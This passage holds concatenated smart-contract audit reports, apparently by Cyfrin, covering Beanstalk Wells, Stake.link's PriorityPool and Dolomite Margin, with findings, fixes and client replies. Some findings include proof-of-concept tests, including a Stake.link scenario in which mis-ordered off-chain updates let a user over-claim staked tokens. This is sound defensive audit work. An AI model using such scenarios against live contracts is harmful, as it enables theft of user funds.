    // - 2e6 * 10 blocks
    // average reserves over 20 blocks:
    // - 15e5
    // assertApproxEqAbs(twaReserves[0], 1.5e5, 1);
    // instead, we get:
    // b[0] = 2070529

    // the reserves of b[1]:
    // - 2e6 * 10 blocks
    // - 4e6 * 10 blocks
    // average reserves over 20 blocks:
    // - 3e6
    assertApproxEqAbs(twaReserves[1], 3e6, 1);
    // instead, we get:
    // b[1] = 4141059
}
```

**Recommended Mitigation:** Disallow reading from the pump with fewer than 2 updates.

**Beanstalk:** This is due to a bug in `MockReserveWell`. Before the Well would make the Pump update call with the new reserves. However, the Well should update the Pump with the previous reserves.

This issue with `MockReserveWell` has been fixed [here](https://github.com/BeanstalkFarms/Basin/commit/6f55fb4835dba6f7b4a69c22687c83039cac2af1#diff-e982575c648d2eaa2de1e69b9ea2f4e91b7ffdeb9455ddacd86c70239972dc84).

Upon running the test now, you will see that `twaReserve[0] = 1414213`. This is expected as `sqrt(1e6 * 2e6) = 1414213`. Also, `twaReserve[1] = 2828427`. This is also expected as `sqrt(2e6 * 4e6) = 2828427`.

**Cyfrin:** Acknowledged.


### Lack of validation for `A` in `GeoEmaAndCumSmaPump::constructor`

**Description:** In the `GeoEmaAndCumSmaPump::constructor`, the EMA parameter ($\alpha$) `A` is initialized to `_A`. This parameter is supposed to be less than 1 otherwise `GeoEmaAndCumSmaPump::update` will revert due to underflow.

**Impact:** Given this initialization is done by the deployer on initialization, we evaluate the severity to LOW.

**Recommended Mitigation:** Require the initialization value `_A` to be less than `ABDKMathQuad.ONE`.

**Beanstalk:** Fixed in commit [e834f9f](https://github.com/BeanstalkFarms/Basin/commit/e834f9f6114815fbfef1a406cb0bb773449a6bc2).

**Cyfrin:** Acknowledged.


### Incorrect sload in LibBytes

**Description:** The function `storeUint128` in `LibBytes` intends to pack uint128 `reserves` starting at the given slot but will overwrite the final slot if [storing an odd number of reserves](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/libraries/LibBytes.sol#L70). It is currently only ever called in [`Well::_setReserves`](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/Well.sol#L609) which takes as input the result of `Well::_updatePumps` which itself always takes `_tokens.length` as an argument. Hence, in the case of an odd number of tokens, the final 128 bits in the slot are never accessed, regardless of the error. However, there may be a case in which the library is used by other implementations, setting a variable number of reserves at any one time rather than always acting on the length of tokens, which may inadvertently overwrite the final reserve to zero.

**Impact:** Given assets are not directly at risk, we evaluate the severity to LOW.

**Proof of Concept:** The following test case demonstrates this issue more clearly:

```solidity
// NOTE: Add to LibBytes.t.sol
function test_exploitStoreAndRead() public {
    // Write to storage slot to demonstrate overwriting existing values
    // In this case, 420 will be stored in the lower 128 bits of the last slot
    bytes32 slot = RESERVES_STORAGE_SLOT;
    uint256 maxI = (NUM_RESERVES_MAX - 1) / 2;
    uint256 storeValue = 420;
    assembly {
        sstore(add(slot, mul(maxI, 32)), storeValue)
    }

    // Read reserves and assert the final reserve is 420
    uint[] memory reservesBefore = LibBytes.readUint128(RESERVES_STORAGE_SLOT, NUM_RESERVES_MAX);
    emit log_named_array("reservesBefore", reservesBefore);

    // Set up reserves to store, but only up to NUM_RESERVES_MAX - 1 as we have already stored a value in the last 128 bits of the last slot
    uint[] memory reserves = new uint[](NUM_RESERVES_MAX - 1);
    for (uint i = 1; i < NUM_RESERVES_MAX; i++) {
        reserves[i-1] = i;
    }

    // Log the last reserve before the store, perhaps from other implementations which don't always act on the entire reserves length
    uint256 t;
    assembly {
        t := shr(128, shl(128, sload(add(slot, mul(maxI, 32)))))
    }
    emit log_named_uint("final slot, lower 128 bits before", t);

    // Store reserves
    LibBytes.storeUint128(RESERVES_STORAGE_SLOT, reserves);

    // Re-read reserves and compare
    uint[] memory reserves2 = LibBytes.readUint128(RESERVES_STORAGE_SLOT, NUM_RESERVES_MAX);

    emit log_named_array("reserves", reserves);
    emit log_named_array("reserves2", reserves2);

    // But wait, what about the last reserve
    assembly {
        t := shr(128, shl(128, sload(add(slot, mul(maxI, 32)))))
    }

    // Turns out it was overwritten by the last store as it calculates the sload incorrectly
    emit log_named_uint("final slot, lower 128 bits after", t);
}
```

Output before mitigation:

```
reservesBefore: [0, 0, 0, 0, 0, 0, 0, 420]
final slot, lower 128 bits before: 420
reserves: [1, 2, 3, 4, 5, 6, 7]
reserves2: [1, 2, 3, 4, 5, 6, 7, 0]
final slot, lower 128 bits after: 0
```

**Recommended Mitigation:** Implement the following fix to load the existing value from storage and pack in the lower bits:

```solidity
	sload(add(slot, mul(maxI, 32)))
```

Output after mitigation:

```
reservesBefore: [0, 0, 0, 0, 0, 0, 0, 420]
final slot, lower 128 bits before: 420
reserves: [1, 2, 3, 4, 5, 6, 7]
reserves2: [1, 2, 3, 4, 5, 6, 7, 420]
final slot, lower 128 bits after: 420
```

**Beanstalk:** Fixed in commit [5e61420](https://github.com/BeanstalkFarms/Basin/pull/71/commits/5e614205a49f1388c36b2a02ce38cf0df317dfde).

**Cyfrin:** Acknowledged.

\clearpage
## Informational


### Non-standard storage packing

Per the [Solidity docs](https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html), the first item in a packed storage slot is stored lower-order aligned; however, [manual packing](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/libraries/LibBytes.sol#L37) in `LibBytes` does not follow this convention. Modify the `storeUint128` function to store the first packed value at the lower-order aligned position.

**Beanstalk:** Fixed in commit [5e61420](https://github.com/BeanstalkFarms/Basin/pull/71/commits/5e614205a49f1388c36b2a02ce38cf0df317dfde).

**Cyfrin:** Acknowledged.


### EIP-1967 second pre-image best practice

When calculating custom [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967) storage slots, as in [Well.sol::RESERVES_STORAGE_SLOT](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/Well.sol#L25), it is [best practice](https://ethereum-magicians.org/t/eip-1967-standard-proxy-storage-slots/3185?u=frangio) to add an offset of `-1` to the hashed value to further reduce the possibility of a second pre-image attack.

**Beanstalk:** Fixed in commit [dc0fe45](https://github.com/BeanstalkFarms/Basin/commit/dc0fe45ae0b85bc230093acc8b35939cbc8f1844).

**Cyfrin:** Acknowledged.


### Remove experimental ABIEncoderV2 pragma

ABIEncoderV2 is enabled by default in Solidity 0.8, so [two](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/interfaces/IWellFunction.sol#L4) [instances](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/interfaces/pumps/IPump.sol#L4) can be removed.

**Beanstalk:** All instances of ABIEncoderV2 pragma have been removed. Fixed in commit [3416a2d](https://github.com/BeanstalkFarms/Basin/commit/3416a2d33876102158ab98a03f409903fe504278).

**Cyfrin:** Acknowledged.


### Inconsistent use of decimal/hex notation in inline assembly

For readability and to prevent errors when working with inline assembly, decimal notation should be used for integer constants and hex notation for memory offsets.

**Beanstalk:** All new code written for Basin uses decimal notation. Decimal notation has been selected for all new code as it is more readable.

Some external libraries use hex notation (Ex. `ABDKMathQuad.sol`. It was decided that it is best to leave these libraries as is instead of modifying them to prevent complication.

**Cyfrin:** Acknowledged.


### Unused imports and errors

In `LibMath`:
- OpenZeppelin SafeMath is imported but not used
- `PRBMath_MulDiv_Overflow` error is declared but never used

**Beanstalk:** Fixed [here](https://github.com/BeanstalkFarms/Basin/pull/65).

**Cyfrin:** Acknowledged.


### Inconsistency in LibMath comments

There is inconsistent use of `x` in comments and `a` in code within the `nthRoot` and `sqrt` [functions](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/libraries/LibMath.sol#L41-L138) of `LibMath`.

**Beanstalk:** Fixed [here](https://github.com/BeanstalkFarms/Basin/pull/65).

**Cyfrin:** Acknowledged.


### FIXME and TODO comments

There are several [FIXME](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/interfaces/IWell.sol#L351) and [TODO](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/libraries/LibMath.sol#L33) comments that should be addressed.

**Beanstalk:** Fixed [here](https://github.com/BeanstalkFarms/Basin/pull/65).

**Cyfrin:** Acknowledged.


### Use correct NatSpec tags

Uses of `@dev See {IWell.fn}` should be replaced with `@inheritdoc IWell` to inherit the NatSpec documentation from the interface.

**Beanstalk:** Dont see any instances of `@dev See {IWell.fn}`. Removed similar instances of `See: {IAquifer.fn}`. Looking at the natspec [documentation](https://docs.soliditylang.org/en/v0.7.6/natspec-format.html#inheritance-notes), it says Functions without NatSpec will automatically inherit the documentation of their base function. Thus, it seems that adding @inheritdoc tags is unnecessary.

**Cyfrin:** Acknowledged.


### Poorly descriptive variable and function names in `GeoEmaAndCumSmaPump` are difficult to read

For example, in `update`:
* `b` could be renamed `returnedReserves`.
* `aN` could be renamed `alphaN` or `alphaRaisedToTheDeltaTimeStamp`.

Additionally, `A`/`_A` could be renamed `ALPHA`, and `readN` could be renamed `readNumberOfReserves`.

**Beanstalk:** Fixed in commit [3bf0080](https://github.com/BeanstalkFarms/Basin/pull/78/commits/3bf0080f7597eb3dfc276ece6207f4f98dcc3db3).

* Rename `Reserves` struct to `PumpState`.
* Rename `b` to `pumpState`.
* Rename `readN` to `readNumberOfReserves`.
* Rename `n` to `numberOfReserves`.
* Rename `_A` to `_alpha`.
* Rename `A` to `ALPHA`.
* Rename `aN` to `alphaN`.

**Cyfrin:** Acknowledged.


### Remove TODO Check if bytes shift is necessary

In `LibBytes16::readBytes16`, the following line has a `TODO`:

```mstore(add(reserves, 64), shl(128, sload(slot))) // TODO: Check if byte shift is necessary```

Since two reserve elements' worth of data is stored in a single slot, the left shift is indeed needed. The following test shows how these are different:

```solidity
function testNeedLeftShift() public {
    uint256 reservesSize = 2;
    uint256 slotNumber = 12345;
    bytes32 slot = bytes32(slotNumber);

    bytes16[] memory leftShiftreserves = new bytes16[](reservesSize);
    bytes16[] memory noShiftreserves = new bytes16[](reservesSize);

    // store some data in the slot
    assembly {
        sstore(
            slot,
            0x0000000000000000000000000000007b00000000000000000000000000000011
        )
    }

    // left shift
    assembly {
        mstore(add(leftShiftreserves, 32), sload(slot))
        mstore(add(leftShiftreserves, 64), shl(128, sload(slot)))
    }

    // no shift
    assembly {
        mstore(add(noShiftreserves, 32), sload(slot))
        mstore(add(noShiftreserves, 64), sload(slot))
    }
    assert(noShiftreserves[1] != leftShiftreserves[1]);
}
```

**Beanstalk:** Fixed [here](https://github.com/BeanstalkFarms/Basin/pull/66).

**Cyfrin:** Acknowledged.


### Use underscore prefix for internal functions

For functions such as `getSlotForAddress`, it is more readable to have this function be named `_getSlotForAddress` so readers know it is an internal function. A similarly opinionated recommendation is to use `s_` for storage variables and `i_` for immutable variables.

**Beanstalk:** Decided to add the `_` prefix to internal functions, but not the `s_` or `i_` prefix. Fixed in commit [86c471f](https://github.com/BeanstalkFarms/Basin/pull/76/commits/86c471f9767ccea4bfa49a34fd6344ae77e74f24).

**Cyfrin:** Acknowledged.


### Missing test coverage for a number of functions

Consider adding tests for `GeoEmaAndCumSmaPump::getSlotsOffset`, `GeoEmaAndCumSmaPump::getDeltaTimestamp`, and `_getImmutableArgsOffset` to increase test coverage and confidence that they are working as expected.

**Beanstalk:** Fixed [here](https://github.com/BeanstalkFarms/Basin/pull/67).

**Cyfrin:** Acknowledged.


### Use `uint256` over `uint`

`uint` is an alias for `uint256` and is not recommended for use. The variable size should be clarified, as this can cause issues when encoding data with selectors if the alias is mistakenly used within the signature string.

**Beanstalk:** Fixed in commit [7ca7d64](https://github.com/BeanstalkFarms/Basin/commits/7ca7d64866ee8235641c6cc4bb71df511d1f61a5).

**Cyfrin:** Acknowledged.


### Use constant variables in place of inline magic numbers

When using numbers, it should be made clear what the number represents by storing it as a constant variable.

For example, in `Well.sol`, the calldata location of the pumps is given by the following:

```solidity
uint dataLoc = LOC_VARIABLE + numberOfTokens() * 32 + wellFunctionDataLength();
```

Without additional knowledge, it may be difficult to read and so it is recommended to assign variables such as:

```solidity
uint256 constant ONE_WORD = 32;
uint256 constant PACKED_ADDRESS = 20;
...
uint dataLoc = LOC_VARIABLE + numberOfTokens() * ONE_WORD + wellFunctionDataLength();
```

The same recommendation can be applied to inline assembly blocks, which perform shifts such that numbers like `248` and `208` have some verbose meaning.

Additionally, when packing values in immutable data/storage, the code would benefit from a note explicitly stating where this is the case, e.g. pumps.

**Beanstalk:** Converted instances of `32` and `20` to `ONE_WORD` and `PACKED_ADDRESS`. Fixed [here](https://github.com/BeanstalkFarms/Basin/pull/66).

**Cyfrin:** Acknowledged.


### Insufficient use of NatSpec and comments on complex code blocks

Many low-level functions, such as `WellDeployer::encodeAndBoreWell`, are missing NatSpec documentation. Additionally, many math-heavy contracts and libraries can only be easier to understand with NatSpec and supporting comments.

**Beanstalk:** Added natspec to `encodeAndBoreWell`. Fixed [here](https://github.com/BeanstalkFarms/Basin/pull/65).

**Cyfrin:** Acknowledged.


### Precision loss on large values transformed between log2 scale and the normal scale

In `GeoEmaAndCumSmaPump.sol::_init`, the reserve values are transformed into log2 scale:

```solidity
byteReserves[i] = reserves[i].fromUIntToLog2();
```

This transformation implies a precision loss, particularly for large `uint256` values, as demonstrated by the following test:

```solidity
function testUIntMaxToLog2() public {
uint x = type(uint).max;
bytes16 y = ABDKMathQuad.fromUIntToLog2(x);
console.log(x);
console.logBytes16(y);
assertEq(ABDKMathQuad.fromUInt(x).log_2(), ABDKMathQuad.fromUIntToLog2(x));
uint x_recover = ABDKMathQuad.pow_2ToUInt(y);
console.log(ABDKMathQuad.toUInt(y));
console.log(x_recover);
}
```

Consider explicit limiting of the reserve values to avoid precision loss.

**Beanstalk:** This is expected. Compressing a uint256 into a bytes16 can't possibly not lose precision as it is compressing 256 bits into 128 bits. E.g. there is only 113-bit decimal precision on the log operation. See [here](https://github.com/abdk-consulting/abdk-libraries-solidity/blob/master/ABDKMathQuad.md#ieee-754-quadruple-precision-floating-point-numbers).

**Cyfrin:** Acknowledged.


### Emit events prior to external interactions

To strictly conform to the [Checks Effects Interactions pattern](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html), it is recommended to emit events before any external interactions. Implementing this pattern is generally advised to ensure correct migration through state reconstruction, which in this case, it should not be affected given that all instances in `Well.sol` are protected by the `nonReentrant` modifier, but it is still good practice.

**Beanstalk:** Decided not to implement due to the complexity of the change and its optionality.

**Cyfrin:** Acknowledged.


### Time Weighted Average Price oracles are susceptible to manipulation

It should be noted that on-chain TWAP oracles are [susceptible to manipulation](https://eprint.iacr.org/2022/445.pdf). Using them to power critical parts of any on-chain protocol is [potentially dangerous](https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/).

**Beanstalk:** This is our best attempt at a manipulation-resistant oracle. Manipulation will always be possible, but we believe that there is significant protection against Oracle manipulation in our implementation.

**Cyfrin:** Acknowledged.

\clearpage
## Gas Optimization


### Simplify modulo operations

In `LibBytes::storeUint128` and `LibBytes::readUint128`, `reserves.lenth % 2 == 1` and `i % 2 == 1` can be simplified to `reserves.length & 1 == 1` and `i & 1 == 1`.

**Beanstalk:** Fixed in commit [9db714a](https://github.com/BeanstalkFarms/Basin/commits/9db714a35a8674852e4c9ac41e1b9e548e21b38f).

**Cyfrin:** Acknowledged.


### Branchless optimization

The `sqrt` function in `MathLib` and [related comment](https://github.com/BeanstalkFarms/Wells/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/libraries/LibMath.sol#L129-L136) should be updated to reflect changes in Solmate's `FixedPointMathLib` which now includes the [branchless optimization](https://github.com/transmissions11/solmate/blob/1b3adf677e7e383cc684b5d5bd441da86bf4bf1c/src/utils/FixedPointMathLib.sol#L220-L225) `z := sub(z, lt(div(x, z), z))`.

**Beanstalk:** Fixed in commit [46b24ac](https://github.com/BeanstalkFarms/Basin/commit/46b24aca0c65793604e3c24a07debfe163c5322a).

**Cyfrin:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2023-06-16-cyfrin-beanstalk-wells.md ------


------ FILE START car/reports_md/2023-08-25-cyfrin-stake-link.md ------

## Medium Risk
### The off-chain mechanism must be ensured to work in a correct order strictly

**Severity:** Medium

**Description:** The `PriorityPool` contract relies on the distribution oracle for accounting and the accounting calculation is done off-chain.

According to the communication with the protocol team, the correct workflow for queued deposits can be described as below:
- Whenever there is a new room for deposit in the staking pool, the function `depositQueuedTokens` is called.
- The `PriorityPool` contract is paused by calling `pauseForUpdate()`.
- Accounting calculations happen off-chain using the function `getAccountData()` and `getDepositsSinceLastUpdate()`(`depositsSinceLastUpdate`) variable to compose the latest Merkle tree.
- The distribution oracle calls the function `updateDistribution()` and this will resume the `PriorityPool`.

The only purpose of pausing the queue contract is to prevent unqueue until the accounting status are updated.
Through an analysis we found that the off-chain mechanism MUST follow the order very strictly or else user funds can be stolen.
While we acknowledge that the protocol team will ensure it, we decided to keep this finding as a medium risk because we can not verify the off-chain mechanism.

**Impact:** If the off-chain mechanism occurs in a wrong order by any chance, user funds can be stolen.
Given the likelihood is low, we evaluate the impact to be Medium.

**Proof of Concept:** The below test case shows the attack scenario.
```javascript
  it('Cyfrin: off-chain mechanism in an incorrect order can lead to user funds being stolen', async () => {
    // try deposit 1500 while the capacity is 1000
    await strategy.setMaxDeposits(toEther(1000))
    await sq.connect(signers[1]).deposit(toEther(1500), true)

    // 500 ether is queued for accounts[1]
    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1000)
    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 500)
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 8500)

    // unqueue 500 ether should work while no updateDistribution was called
    await sq.connect(signers[1]).unqueueTokens(0, 0, [], toEther(500))
    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 0)
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)

    // deposit again
    await sq.connect(signers[1]).deposit(toEther(500), true)
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 8500)

    // victim deposits 500 ether and it will be queued
    await sq.connect(signers[2]).deposit(toEther(500), true)
    assert.equal(fromEther(await sq.totalQueued()), 1000)

    // max deposit has increased to 1500
    await strategy.setMaxDeposits(toEther(1500))

    // user sees that his queued tokens 500 can be deposited and call depositQueuedTokens
    // this will deposit the 500 ether in the queue
    await sq.connect(signers[1]).depositQueuedTokens()

    // Correct off-chain mechanism: pauseForUpdate -> getAccountData -> updateDistribution
    // Let us see what happens if getAccountData is called before pauseForUpdate

    // await sq.pauseForUpdate()

    // check account data
    var a_data = await sq.getAccountData()
    assert.equal(ethers.utils.formatEther(a_data[2][1]), "500.0")
    assert.equal(ethers.utils.formatEther(a_data[2][2]), "500.0")

    // user calls unqueueTokens to get his 500 ether back
    // this is possible because the queue contract is not paused
    await sq.connect(signers[1]).unqueueTokens(0, 0, [], toEther(500))

    // pauseForUpdate is called at a wrong order
    await sq.pauseForUpdate()

    // at this point user has 1000 ether staked and 9000 ether in his wallet
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)
    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1000)

    // now updateDistribution is called with the wrong data
    let data = [
      [ethers.constants.AddressZero, toEther(0), toEther(0)],
      [accounts[1], toEther(500), toEther(500)],
    ]
    let tree = StandardMerkleTree.of(data, ['address', 'uint256', 'uint256'])

    await sq.updateDistribution(
      tree.root,
      ethers.utils.formatBytes32String('ipfs'),
      toEther(500),
      toEther(500)
    )

    // at this point user claims his LSD tokens
    await sq.connect(signers[1]).claimLSDTokens(toEther(500), toEther(500), tree.getProof(1))

    // at this point user has 1500 ether staked and 9000 ether in his wallet
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)
    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1500)
  })
```
**Recommended Mitigation:** Consider to force pause the contract at the end of the function `_depositQueuedTokens`.

**Client:**
Acknowledged. The protocol team will ensure the correct order of the off-chain mechanism.

**Cyfrin:** Acknowledged.

### User's funds are locked temporarily in the PriorityPool contract

**Severity:** Medium

**Description:** The protocol intended to utilize the deposit queue for withdrawal to minimize the stake/unstake interaction with the staking pool.
When a user wants to withdraw, they are supposed to call the function `PriorityPool::withdraw()` with the desired amount as a parameter.
```solidity
function withdraw(uint256 _amount) external {//@audit-info LSD token
    if (_amount == 0) revert InvalidAmount();
    IERC20Upgradeable(address(stakingPool)).safeTransferFrom(msg.sender, address(this), _amount);//@audit-info get LSD token from the user
    _withdraw(msg.sender, _amount);
}
```
As we can see in the implementation, the protocol pulls the `_amount` of LSD tokens from the user first and then calls `_withdraw()` where the actual withdrawal utilizing the queue is processed.
```solidity
function _withdraw(address _account, uint256 _amount) internal {
    if (poolStatus == PoolStatus.CLOSED) revert WithdrawalsDisabled();

    uint256 toWithdrawFromQueue = _amount <= totalQueued ? _amount : totalQueued;//@audit-info if the queue is not empty, we use that first
    uint256 toWithdrawFromPool = _amount - toWithdrawFromQueue;

    if (toWithdrawFromQueue != 0) {
        totalQueued -= toWithdrawFromQueue;
        depositsSinceLastUpdate += toWithdrawFromQueue;//@audit-info regard this as a deposit via the queue
    }

    if (toWithdrawFromPool != 0) {
        stakingPool.withdraw(address(this), address(this), toWithdrawFromPool);//@audit-info withdraw from pool into this contract
    }

    //@audit-warning at this point, toWithdrawFromQueue of LSD tokens remain in this contract!

    token.safeTransfer(_account, _amount);//@audit-info
    emit Withdraw(_account, toWithdrawFromPool, toWithdrawFromQueue);
}
```
But looking in the function `_withdraw()`, only `toWithdrawFromPool` amount of LSD tokens are withdrawn (burn) from the staking pool and `toWithdrawFromQueue` amount of LSD tokens remain in the `PriorityPool` contract.
On the other hand, the contract tracks the queued amount for users by the mapping `accountQueuedTokens` and this leads to possible mismatch in the accounting.
Due to this mismatch, a user's LSD tokens can be locked in the `PriorityPool` contract while the user sees his queued amount (`getQueuedTokens()`) is positive.
Users can claim the locked LSD tokens once the function `updateDistribution` is called.
Through the communication with the protocol team, it is understood that `updateDistribution` is expected to be called _probably every 1-2 days unless there were any new deposits into the staking pool_.
So it means user's funds can be locked temporarily in the contract which is unfair for the user.

**Impact:** User's LSD tokens can be locked temporarily in the PriorityPool contract

**Proof of Concept:**
```javascript
 it('Cyfrin: user funds can be locked temporarily', async () => {
    // try deposit 1500 while the capacity is 1000
    await strategy.setMaxDeposits(toEther(1000))
    await sq.connect(signers[1]).deposit(toEther(1500), true)

    // 500 ether is queued for accounts[1]
    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1000)
    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 500)
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 8500)
    assert.equal(fromEther(await sq.totalQueued()), 500)
    assert.equal(fromEther(await stakingPool.balanceOf(sq.address)), 0)

    // at this point user calls withdraw (maybe by mistake?)
    // withdraw swipes from the queue and the deposit room stays at zero
    await stakingPool.connect(signers[1]).approve(sq.address, toEther(500))
    await sq.connect(signers[1]).withdraw(toEther(500))

    // at this point getQueueTokens[accounts[1]] does not change but the queue is empty
    // user will think his queue position did not change and he can simply unqueue
    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 500)
    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 500)
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)
    assert.equal(fromEther(await sq.totalQueued()), 0)
    // NOTE: at this point 500 ethers of LSD tokens are locked in the queue contract
    assert.equal(fromEther(await stakingPool.balanceOf(sq.address)), 500)

    // but unqueueTokens fails because actual totalQueued is zero
    await expect(sq.connect(signers[1]).unqueueTokens(0, 0, [], toEther(500))).to.be.revertedWith(
      'InsufficientQueuedTokens()'
    )

    // user's LSD tokens are still locked in the queue contract
    await stakingPool.connect(signers[1]).approve(sq.address, toEther(500))
    await sq.connect(signers[1]).withdraw(toEther(500))
    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 0)
    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 500)
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9500)
    assert.equal(fromEther(await sq.totalQueued()), 0)
    assert.equal(fromEther(await stakingPool.balanceOf(sq.address)), 500)

    // user might try withdraw again but it will revert because user does not have any LSD tokens
    await stakingPool.connect(signers[1]).approve(sq.address, toEther(500))
    await expect(sq.connect(signers[1]).withdraw(toEther(500))).to.be.revertedWith(
      'Transfer amount exceeds balance'
    )

    // in conclusion, user's LSD tokens are locked in the queue contract and he cannot withdraw them
    // it is worth noting that the locked LSD tokens are credited once updateDistribution is called
    // so the lock is temporary
  })
```
**Recommended Mitigation:** Consider add a feature to allow users to withdraw LSD tokens from the contract directly.

**Client:**
Fixed in this [PR](https://github.com/stakedotlink/contracts/pull/32).

**Cyfrin:** Verified.

## Low Risk
### Do not use deprecated library functions
```solidity
File: PriorityPool.sol

103:         token.safeApprove(_stakingPool, type(uint256).max);

```


## Informational
### Unnecessary event emissions
`PriorityPool::setPoolStatusClosed` does not check if pool status is already `CLOSED` and emits `SetPoolStatus` event. Avoid event emission if the pool status is already closed. Avoid this. The same applies to the function `setPoolStatus` as well.

### Missing checks for `address(0)` when assigning values to address state variables

```solidity
File: PriorityPool.sol

399:         distributionOracle = _distributionOracle;

```

### Functions not used internally could be marked external
```solidity
File: PriorityPool.sol

89:     function initialize(

278:     function depositQueuedTokens() public {

```

------ FILE END car/reports_md/2023-08-25-cyfrin-stake-link.md ------


------ FILE START car/reports_md/2023-08-26-cyfrin-dolomite-margin.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

[Hans](https://twitter.com/hansfriese)

[Carlos](https://twitter.com/carlitox477)

**Assisting Auditors**

[Alex Roan](https://twitter.com/alexroan)


---

# Findings
## Medium Risk


### Chainlink price and L2 sequencer uptime feeds are not used with recommended validations and guardrails

**Description:** [`ChainlinkPriceOracleV1`](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/external/oracles/ChainlinkPriceOracleV1.sol) is an implementation of [IPriceOracle](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/external/oracles/ChainlinkPriceOracleV1.sol#L38) which is used in [`Storage::fetchPrice`](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/lib/Storage.sol#L455-L456). The protocol currently validates [price cannot be zero](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/lib/Storage.sol#L457-L462), but there exist no checks for staleness and round incompleteness which could result in use of an incorrect non-zero price. `ChainlinkPriceOracleV1` currently uses the [deprecated](https://docs.chain.link/data-feeds/api-reference) `IChainlinkAggregator::latestAnswer` function instead of the recommended `IChainlinkAggregator::latestRoundData` function in conjunction with these additional validations.

L2 sequencer downtime validation is handled by calls to a contract conforming to the [IOracleSentinel interface](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/interfaces/IOracleSentinel.sol#L27-L28) in both [`OperationImpl::_verifyFinalState`](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/OperationImpl.sol#L317) and [`LiquidateOrVaporizeImpl::liquidate`](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/LiquidateOrVaporizeImpl.sol#L64). The contract on which [`getFlag`](https://arbiscan.io/address/0x3c14e07edd0dc67442fa96f1ec6999c57e810a83#code) is called simply returns the sequencer uptime status and nothing else.

When an L2 sequencer comes back online after a period of downtime and oracles update their prices, all price movements that occurred during downtime are applied at once. If these movements are significant, borrowers rush to save their positions, while liquidators rush to liquidate borrowers. Since liquidations are in the future intended to be handled by Chainlink Automation, without some grace period where liquidations are disallowed, borrowers are likely to suffer mass liquidations. This is unfair to borrowers, as they could not act on their positions even if they wanted to due to the L2 downtime.

**Impact:**
1. Lack of staleness and round-incompleteness validation could result in the use of an incorrect non-zero price.
2. Lack of a sequencer downtime grace period could mean that borrow positions become immediately liquidatable once the sequencer is back up and running if there is a large price deviation in the intermediate time period.

**Recommended Mitigation:** The Dolomite Margin protocol should correctly validate values returned by Chainlink data feeds and give borrowers a grace period to deposit additional collateral prior to allowing liquidations to resume after a period of L2 sequencer downtime.

**Dolomite:** Fixed as of commit[6a8ae06](https://github.com/dolomite-exchange/dolomite-margin/commit/6a8ae061fa84110db7b111512f705a6cd0a472bb).

**Cyfrin:** Acknowledged.


### Admin can drain market of double-entrypoint ERC-20 using `AdminImpl::ownerWithdrawUnsupportedTokens`

**Description:** `AdminImpl::ownerWithdrawUnsupportedTokens` is intended to allow the owner to withdraw any unsupported ERC-20 token which might have ended up at the Dolomite Margin address. If a double-entrypoint ERC-20 token is listed as a market on Dolomite, it is possible for the admin to drain the entire token balance.

Such tokens are problematic because the legacy token delegates its logic to the new token, meaning that two separate addresses are used to interact with the same token. Previous examples include TUSD which resulted in [vulnerability when integrated into Compound](https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective/). This highlights the importance of carefully selecting the collateral token, especially as this type of vulnerability is not easily detectable. In addition, it is not unrealistic to expect that an upgradeable collateral token could become a double-entrypoint token in the future, e.g. USDT, so this must also be considered.

